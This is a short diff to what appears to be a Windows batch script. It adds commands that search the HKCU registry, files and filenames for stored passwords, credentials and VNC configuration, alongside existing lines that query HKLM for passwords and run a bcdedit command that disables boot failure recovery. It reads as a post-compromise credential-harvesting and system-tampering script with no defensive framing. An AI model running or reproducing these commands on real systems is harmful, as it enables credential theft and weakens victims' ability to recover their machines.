@@ -172,6 +172,14 @@ cls
 ECHO ============================
 reg query HKLM /f password /t REG_SZ /s
 ECHO ============================
+reg query HKCU /f password /t REG_SZ /s
+ECHO ============================
+findstr /snip password *.xml *.ini *.txt
+ECHO ============================
+dir /s *password* == *cred* == *vnc* == *.config*
+ECHO ============================
+dir c:\*vnc.ini /s /b
+ECHO ============================
 fsutil fsinfo drives
 ECHO ============================
 bcdedit /set {current} bootstatuspolicy ignoreallfailures
